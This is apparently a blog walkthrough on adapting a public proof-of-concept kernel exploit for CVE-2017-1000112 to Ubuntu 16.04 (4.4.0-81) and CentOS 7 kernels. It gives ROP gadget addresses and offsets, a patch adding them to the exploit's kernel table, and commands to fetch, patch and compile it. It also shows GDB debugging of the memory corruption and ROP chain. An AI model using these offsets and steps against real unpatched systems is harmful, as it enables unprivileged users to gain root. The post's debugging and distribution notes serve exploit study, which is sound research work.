<a href="https://2.bp.blogspot.com/-C8ZzIJ1DzZs/WjwAuOo83mI/AAAAAAAAAUA/bEjLiTg33o4o8lDnX5qFOVEjtSdl-OhBwCEwYBhgL/s1600/debug_kernel.png" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" data-original-height="46" data-original-width="946" height="30" src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/debug_kernel.png" width="640"></a></div>
<br>
<br>
<br>
<br>
<h3>
Install and run ROPgadget against the target kernel</h3>
I will use ropgadget: <a href="https://github.com/JonathanSalwan/ROPgadget">https://github.com/JonathanSalwan/ROPgadget</a>, to find the gadgets in the kernel. <br>
<br>
<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">apt install python-pip python-capstone</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">pip install ropgadget</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">ROPgadget --binary /usr/lib/debug/boot/vmlinux-4.4.0-81-generic &gt; ~/rg-4.4.0-81-generic</span><br>
<br>
Now that we have a list of possible gadgets, we need to find the addresses to match the rop chain from the POC<br>
<br>
struct kernel_info {<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; const char* distro;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; const char* version;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uint64_t commit_creds;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">sudo grep commit_creds /proc/kallsyms<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xffffffff810a2800 T commit_creds</span><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uint64_t prepare_kernel_cred;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">sudo grep prepare_kernel_cred /proc/kallsyms<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xffffffff810a2bf0 T prepare_kernel_cred</span><br>
&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uint64_t xchg_eax_esp_ret;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><b>grep ': xchg eax, esp ; ret' rg-4.4.0-81-generic </b><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xffffffff8100008a : xchg eax, esp ; ret</span><br>
<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uint64_t pop_rdi_ret;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><b>grep ': pop rdi ; ret' rg-4.4.0-81-generic</b> <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xffffffff813eb4ad : pop rdi ; ret</span><br>
<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uint64_t mov_dword_ptr_rdi_eax_ret;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><b>grep ': mov dword ptr \[rdi\], eax ; ret' rg-4.4.0-81-generic </b><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xffffffff81112697 : mov dword ptr [rdi], eax ; ret</span><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uint64_t mov_rax_cr4_ret;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">sudo grep cr4 /proc/kallsyms<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xffffffff8101b9c0 t native_read_cr4_safe</span><br>
&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uint64_t neg_rax_ret;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><b>grep ': neg rax ; ret' rg-4.4.0-81-generic</b> <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xffffffff8140341a : neg rax ; ret</span><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uint64_t pop_rcx_ret;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><b>grep ': pop rcx ; ret' rg-4.4.0-81-generic</b> <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xffffffff8101de6c : pop rcx ; ret</span><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uint64_t or_rax_rcx_ret;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><b>grep ': or rax, rcx ; ret' rg-4.4.0-81-generic</b> <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xffffffff8107a453 : or rax, rcx ; re</span>t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uint64_t xchg_eax_edi_ret;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><b>grep ': xchg eax, edi ; ret' rg-4.4.0-81-generic</b> <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xffffffff81125787 : xchg eax, edi ; r</span>et<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uint64_t mov_cr4_rdi_ret;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">sudo grep cr4 /proc/kallsyms<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xffffffff81064580 t native_write_cr4</span><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uint64_t jmp_rcx;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><b>grep ': jmp rcx' rg-4.4.0-81-generic </b><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xffffffff81049ed0 : jmp rcx</span><br>
};<br>
<br>
<br>
<h3>
KASLR</h3>
<br>
The 4.4.0-81 kernel does not have KASLR enabled, but to conform to the existing file, we will use offsets. For each address subtract 0xffffffff81000000, the base address of the kernel. <br>
<br>
To find the base address of the kernel <br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">sudo grep text /proc/kallsyms <br>ffffffff81000000 T _text</span><br>
<br>
For example, to determine the offset of commit_creds<br>
0xffffffff810a2800 - 0xffffffff81000000 = 0xa2800<br>
<br>
<br>
Note: If you are using a kernel that does have KASLR enabled 
(https://unix.stackexchange.com/questions/397939/turning-off-kaslr-to-debug-linux-kernel-using-qemu-and-gdb)<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">$ grep GRUB_CMDLINE_LINUX_DEFAULT /etc/default/grub<br>GRUB_CMDLINE_LINUX_DEFAULT="quiet"<br>$ sudo perl -i -pe 'm/quiet/ and s//quiet nokaslr/' /etc/default/grub<br>$ grep quiet /etc/default/grub<br>GRUB_CMDLINE_LINUX_DEFAULT="quiet nokaslr"<br>$ sudo update-grub </span><br>
<br>
<h3>
Updating the original proof of concept file</h3>
<br>
We need to update the POC with the addresses and to expect a 4.4.0 kernel with Ubuntu 16.04 (xenial).<br>
<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><br></span>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">{ "xenial", "4.4.0-81-generic", 0xa2800, 0xa2bf0, 0x8a, 0x3eb4ad, 0x112697, 0x1b9c0, 0x40341a, 0x1de6c, 0x7a453, 0x125787, 0x64580, 0x49ed0 },</span><br>
<br>
<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">unsigned long get_kernel_addr() {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char* syslog;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int size;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mmap_syslog(&amp;syslog, &amp;size);<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (strcmp("trusty", kernels[kernel].distro) == 0 &amp;&amp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strncmp("4.4.0", kernels[kernel].version, 5) == 0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return get_kernel_addr_trusty(syslog, size);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (strcmp("xenial", kernels[kernel].distro) == 0 &amp;&amp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="background-color: yellow;"> (strncmp("4.4.0", kernels[kernel].version, 5) == 0) ||</span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (strncmp("4.8.0", kernels[kernel].version, 5) == 0))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return get_kernel_addr_xenial(syslog, size);<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("[-] KASLR bypass only tested on trusty 4.4.0-* and xenial 4-8-0-*");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(EXIT_FAILURE);<br>}</span><br>
<br>
<br>
<h3>
Patch file</h3>
4.4.0-81.patch<br>
<span style="font-size: x-small;"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">--- poc.c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2017-12-21 11:49:17.758164986 -0600<br>+++ updated.c&nbsp;&nbsp; 2017-12-20 16:21:06.187852954 -0600<br>@@ -117,6 +117,7 @@<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; { "trusty", "4.4.0-79-generic", 0x9ebb0, 0x9ee90, 0x4518a, 0x3ebdcf, 0x1099a7, 0x1a830, 0x3e77ba, 0x1cc8c, 0x774e3, 0x49cdd, 0x62330, 0x1a78b },<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; { "trusty", "4.4.0-81-generic", 0x9ebb0, 0x9ee90, 0x4518a, 0x2dc688, 0x1099a7, 0x1a830, 0x3e789a, 0x1cc8c, 0x774e3, 0x24487, 0x62330, 0x1a78b },<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; { "trusty", "4.4.0-83-generic", 0x9ebc0, 0x9eea0, 0x451ca, 0x2dc6f5, 0x1099b7, 0x1a830, 0x3e78fa, 0x1cc8c, 0x77533, 0x49d1d, 0x62360, 0x1a78b },<br>+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; { "xenial", "4.4.0-81-generic", 0xa2800, 0xa2bf0, 0x8a, 0x3eb4ad, 0x112697, 0x1b9c0, 0x40341a, 0x1de6c, 0x7a453, 0x125787, 0x64580, 0x49ed0 },<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; { "xenial", "4.8.0-34-generic", 0xa5d50, 0xa6140, 0x17d15, 0x6854d, 0x119227, 0x1b230, 0x4390da, 0x206c23, 0x7bcf3, 0x12c7f7, 0x64210, 0x49f80 },<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; { "xenial", "4.8.0-36-generic", 0xa5d50, 0xa6140, 0x17d15, 0x6854d, 0x119227, 0x1b230, 0x4390da, 0x206c23, 0x7bcf3, 0x12c7f7, 0x64210, 0x49f80 },<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; { "xenial", "4.8.0-39-generic", 0xa5cf0, 0xa60e0, 0x17c55, 0xf3980, 0x1191f7, 0x1b170, 0x43996a, 0x2e8363, 0x7bcf3, 0x12c7c7, 0x64210, 0x49f60 },<br>@@ -326,7 +327,8 @@<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strncmp("4.4.0", kernels[kernel].version, 5) == 0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return get_kernel_addr_trusty(syslog, size);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (strcmp("xenial", kernels[kernel].distro) == 0 &amp;&amp;<br>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strncmp("4.8.0", kernels[kernel].version, 5) == 0)<br>+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (strncmp("4.4.0", kernels[kernel].version, 5) == 0) ||<br>+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (strncmp("4.8.0", kernels[kernel].version, 5) == 0))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return get_kernel_addr_xenial(syslog, size);<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("[-] KASLR bypass only tested on trusty 4.4.0-* and xenial 4-8-0-*");</span></span><br>
<br>
<br>
<h3>
Apply the patch</h3>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">wget https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><br></span>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">patch &lt; 4.4.0.81.patch</span><br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><br></span>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">gcc poc.c -o updatedpoc</span><br>
<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://2.bp.blogspot.com/-U0Vhl-WtsmM/WjwAuhA1j2I/AAAAAAAAAUA/rBJtfIBlUgsCx51l8nBNPCsSCJbLRQe2QCEwYBhgL/s1600/final.png" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" data-original-height="976" data-original-width="1250" height="498" src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/final.png" width="640"></a></div>
<br>
<br>
<br>
<br>
<h2>
&nbsp;</h2>
<h2>
Kernel Debugging</h2>
Here is a quick setup using GDB to step through the exploit.<br>
From above, we will be using the target machine to run the exploit and a host machine to view what is happening.<br>
<br>
On the host machine, we have already downloaded the kernel with debug symbols, now lets download the kernel source code for completeness.<br>
<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">wget http://archive.ubuntu.com/ubuntu/pool/main/l/linux/linux-source-4.4.0_4.4.0-81.104_all.deb</span><br>
<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">dpkg -i linux-source-4.4.0_4.4.0-81.104_all.deb</span><br>
<br>
The source is installed at /usr/src/linux-source-4.4.0-81 as a compressed file:&nbsp; <br>
/usr/src/linux-source-4.4.0/linux-source-4.4.0.tar.bz2<br>
<br>
After extracting the source: tar xvjf linux-source-4.4.0.tar.bz2, it is located at:<br>
/usr/src/linux-source-4.4.0/linux-source-4.4.0<br>
<br>
<br>
<h3>
GDB</h3>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">sudo apt install gdb</span><br>
<br>
Install pwndbg: https://github.com/pwndbg/pwndbg<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">git clone https://github.com/pwndbg/pwndbg<br>cd pwndbg<br>./setup.sh&nbsp;</span><br>
<br>
Start GDB, configure the source path, and connect to the target machine<br>
<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">gdb /usr/lib/debug/boot/vmlinux-4.4.0-81-generic</span><br>
<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">set substitute-path /build/linux-cs3yMe/linux-4.4.0/ /usr/src/linux-source-4.4.0/linux-source-4.4.0/</span><br>
<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">target remote 192.168.81.1:8864 </span><br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://2.bp.blogspot.com/-KOkeotrKr5c/WjwAvHR10VI/AAAAAAAAAUA/BbAIm2nFzIQMisWlptiaax8rJqxeGJb0QCEwYBhgL/s1600/gdb_start.png" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" data-original-height="1068" data-original-width="950" height="640" src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/gdb_start.png" width="568"></a></div>
<br>
<br>
<br>
<br>
<br>
<br>
<b>Breakpoints used</b>:<br>
<br>
break __ip_append_data<br>
break __ip_flush_pending_frames<br>
break skb_release_all<br>
<br>
The first hit on __ip_append_data takes the path to ip_ufo_append_data and the second hit uses a non ufo path which introduces the memory corruption.<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://2.bp.blogspot.com/-1EQLNGtsEhI/WjwAfbGZInI/AAAAAAAAATE/jPhzckHXKhIEIGyNIs4UJoBqO8ND6GwMwCEwYBhgL/s1600/1st-ip_append.png" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" data-original-height="946" data-original-width="1248" height="484" src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/1st-ip_append.png" width="640"></a></div>
<span id="goog_1336735093"></span><span id="goog_1336735094"></span><br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
Second hit on __ip_append_data<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://2.bp.blogspot.com/-HqRdIyUtnGs/WjwAtF0-ayI/AAAAAAAAAUA/0WQZi6rdp_8imkduRH_T1HI0V1HPOjBcQCEwYBhgL/s1600/2nd-ip_append.png" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" data-original-height="902" data-original-width="1244" height="464" src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/2nd-ip_append.png" width="640"></a></div>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
Enable the breakpoint on __ip_flush_pending_frames<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://1.bp.blogspot.com/-lNbaVNHaKeA/WjwAtH3FvxI/AAAAAAAAAUA/TuKfEnBSoqUaWA-oP-CgZanLo6_aShVAQCEwYBhgL/s1600/3rd-ip_flush.png" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" data-original-height="930" data-original-width="1246" height="476" src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/3rd-ip_flush.png" width="640"></a></div>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
Enable the breakpoint on skb_release_all<br>
<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://4.bp.blogspot.com/-dDDzZPIXIec/WjwAtasWGWI/AAAAAAAAAUA/pUmY9oAx1XAmxHrDrpcacMsgyhiGpW6wgCEwYBhgL/s1600/4th-skb_release_all.png" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" data-original-height="946" data-original-width="1026" height="588" src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/4th-skb_release_all.png" width="640"></a></div>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
On the break at skb_release_all, we can see where the memory corruption has happened and where the skb_shared_info-&gt;destructor_arg is called into usermode setting up the rop chain. the skb address (0xffff880039161400) is listed above on the call to skb_release_all: <br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://3.bp.blogspot.com/-4lkI_0jUfCI/WjwAv9cb0MI/AAAAAAAAAUA/dra30PwMrJwQS2DjsaAPaNenSWDV9xZbACEwYBhgL/s1600/mlayoutsk_buff.png" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" data-original-height="255" data-original-width="542" height="187" src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/mlayoutsk_buff.png" width="400"></a></div>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
In skb_release_data, the dereference to the start of the ROP chain is located at address: 0xffffffff81720a12.<br>
<br>
At address 0xffffffff81720a1f starts the rop chain.<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://2.bp.blogspot.com/-8Od1bEyF-Ps/WjwEaHbK2kI/AAAAAAAAAUI/eM6drggRFk4WDWIpnLg7VkBofBmnD-RBgCLcBGAs/s1600/startofROPchain.png" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" data-original-height="1036" data-original-width="1038" height="638" src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/startofROPchain.png" width="640"></a></div>
<br>
<br>
And finally the ROP chain in memory<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://1.bp.blogspot.com/-6x-f40r61po/WjwAw_sLXJI/AAAAAAAAAUA/EGonYVTXej4dbB0oYc6O2b2qSRmZXK-EgCEwYBhgL/s1600/ropchaininmemory.png" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" data-original-height="140" data-original-width="476" height="117" src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/ropchaininmemory.png" width="400"></a></div>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<h2>
Linux Distributions</h2>
<h3>
Requirements&nbsp;</h3>
&nbsp;The bug can be exploited by an unprivileged user if:<br>
<br>
1. User can set up an interface with UFO enabled and MTU &lt; 65535 or
such interface is already present in the system. The former is
possible from inside a user namespace.<br>
<br>
2. User can disable the NETIF_F_UFO interface feature or set the
SO_NO_CHECK socket option. The former requires CAP_NET_ADMIN. The
latter is only possible after 40ba330227ad ("udp: disallow UFO for
sockets with SO_NO_CHECK option") from Jan 11 2016.<br>
<br>
Both are possible
from inside a user namespace.

In particular, the bug can be exploited by an unprivileged user if
unprivileged user namespaces are available.<br>
<br>
<b>Checking the status of udp-framentation-offload</b><br>
Loopback<br>
<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">ethtool -k lo |grep udp<br>udp-fragmentation-offload: on</span><br>
<br>
ens33<br>
<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">ethtool -k ens33 |grep udp<br>udp-fragmentation-offload: off [fixed]</span><br>
<h3>
Ubuntu</h3>
Ubuntu, by default, allows for user namespaces<br>
&nbsp; <br>
<a href="https://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-1000112.html">https://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-1000112.html</a><br>
<br>
Package<br>
Source: linux (LP Ubuntu Debian)<br>
Upstream:&nbsp;&nbsp;&nbsp; released (4.13~rc5)<br>
Ubuntu 12.04 ESM (Precise Pangolin): ignored (no user namespace support)<br>
Ubuntu 14.04 LTS (Trusty Tahr):&nbsp;&nbsp;&nbsp; released (3.13.0-128.177)<br>
Ubuntu 16.04 LTS (Xenial Xerus): released (4.4.0-91.114)<br>
Ubuntu 17.04 (Zesty Zapus): released (4.10.0-32.36)<br>
Ubuntu 17.10 (Artful Aardvark):&nbsp;&nbsp;&nbsp; not-affected (4.12.0-11.12)<br>
Ubuntu 18.04 LTS (Bionic Beaver): not-affected (4.13.0-16.19)&nbsp; <br>
<br>
<h3>
RHEL/CentOS</h3>
Centos kernel's are vulnerable but do not allow for usernames spaces by default<br>
<a href="https://access.redhat.com/security/cve/CVE-2017-1000112">https://access.redhat.com/security/cve/CVE-2017-1000112 </a><br>
<br>
CentOS 7 - <a href="https://access.redhat.com/errata/RHSA-2017:2930">https://access.redhat.com/errata/RHSA-2017:2930</a><br>
kernel-3.10.0-693.5.2.el7.x86_64.rpm<br>
<br>
CentOS 6 - <a href="https://access.redhat.com/errata/RHSA-2017:3200">https://access.redhat.com/errata/RHSA-2017:3200</a><br>
kernel-2.6.32-696.16.1.el6.x86_64.rpm<br>
<br>
I successfully tested on CentOS 7, kernel 3.10.0-693.el7.x86_64, but had to artificially lower the mtu on the loopback adapter:<br>
<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">/sbin/ifconfig lo mtu 1500</span><br>
<br>
Offsets:<br>
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">{ "cent7", "3.10.0-693.el7.x86_64", 0xb7670, 0xb7980, 0x8a, 0x39337a, 0x650ca, 0x19bf0, 0x32d41a, 0x11e843, 0x7c6b3, 0x4b8f7, 0x63210, 0x6bab33 } </span><br>
<br>
<br>
<h2>
References</h2>
<ul>
<li><a href="https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c">https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c</a></li>
